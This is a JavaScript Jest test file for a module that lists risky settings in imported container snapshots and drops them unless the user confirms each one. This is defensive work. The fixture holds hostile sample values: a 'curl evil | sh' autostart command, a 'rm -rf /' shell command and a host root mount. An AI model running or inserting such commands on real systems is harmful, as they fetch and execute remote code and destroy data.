'use strict';

const { summarizeRisks, buildImportCreateOptions } = require('../lib/archive/risks');

describe('lib/archive/risks', () => {
    const snapshot = {
        hostPath: '/old', containerPath: '/workspace', imageName: 'img', imageVersion: '1.0.0-common', containerMode: 'sock',
        volumes: ['/:/host', '/exists:/data', '/missing:/m'], ports: ['8080:80'], autostart: 'curl evil | sh',
        env: { A: '1' }, envFile: ['/exists', '/missing', 'relative'], first: { shell: 'rm -rf /' },
        network: { preset: 'custom', outbound: [{ action: 'allow', target: '@any', ports: '', proto: 'all', enabled: true }], inbound: [] }
    };
    const exists = p => p === '/exists';

    test('摘要列出所有高风险设置', () => {
        expect(summarizeRisks(snapshot)).toEqual({ containerMode: 'sock', volumes: ['/:/host', '/exists:/data', '/missing:/m'], ports: ['8080:80'], autostart: true, networkOpen: true });
        expect(summarizeRisks({ containerMode: 'common', network: { preset: 'restricted' } }, '  ')).toEqual({ containerMode: '', volumes: [], ports: [], autostart: false, networkOpen: false });
    });

    test('一项都没确认：sock、挂载、端口、自启动、不限制网络全部去掉，first 永远不带', () => {
        const { createOptions, dropped } = buildImportCreateOptions(snapshot, {}, { hostPath: '/new', pathExists: exists });
        expect(createOptions).toMatchObject({ hostPath: '/new', containerPath: '/workspace', volumes: [], ports: [], autostart: '', envFile: ['/exists'] });
        expect(createOptions.containerMode).toBeUndefined();
        expect(createOptions.network).toBeUndefined();
        expect(createOptions).not.toHaveProperty('first');
        expect(dropped.length).toBeGreaterThanOrEqual(5);
    });

    test('逐项确认后才带上；挂载还要宿主机路径在本机存在；容器模式必须确认的就是它自己', () => {
        const confirm = { containerMode: 'sock', volumes: ['/exists:/data', '/missing:/m'], ports: true, autostart: true, networkOpen: true };
        const { createOptions } = buildImportCreateOptions(snapshot, confirm, { hostPath: '/new', pathExists: exists });
        expect(createOptions).toMatchObject({ containerMode: 'sock', volumes: ['/exists:/data'], ports: ['8080:80'], autostart: 'curl evil | sh' });
        expect(createOptions.network).toBeTruthy();
        expect(buildImportCreateOptions(snapshot, { containerMode: 'dind' }, { hostPath: '/new' }).createOptions.containerMode).toBeUndefined();
    });

    test('“用本机默认版本”不带镜像名和版本', () => {
        expect(buildImportCreateOptions(snapshot, {}, { hostPath: '/n', imageMode: 'default' }).createOptions).not.toHaveProperty('imageName');
        expect(buildImportCreateOptions(snapshot, {}, { hostPath: '/n', imageMode: 'same' }).createOptions.imageName).toBe('img');
    });
});
